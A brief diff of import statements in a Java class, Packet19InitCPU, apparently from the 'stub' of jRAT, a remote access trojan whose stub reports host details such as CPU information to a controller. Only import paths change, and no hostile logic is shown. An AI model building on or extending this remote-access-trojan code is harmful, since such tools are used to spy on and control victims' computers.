@@ -1,13 +1,11 @@
 package io.jrat.stub.packets.outgoing;
 
 import io.jrat.common.io.StringWriter;
-
 import java.io.DataOutputStream;
 import java.io.File;
 import java.util.List;
-
-import com.redpois0n.oslib.OperatingSystem;
-import com.redpois0n.oslib.Utils;
+import oslib.OperatingSystem;
+import oslib.Utils;
 
 
 public class Packet19InitCPU extends AbstractOutgoingPacket {
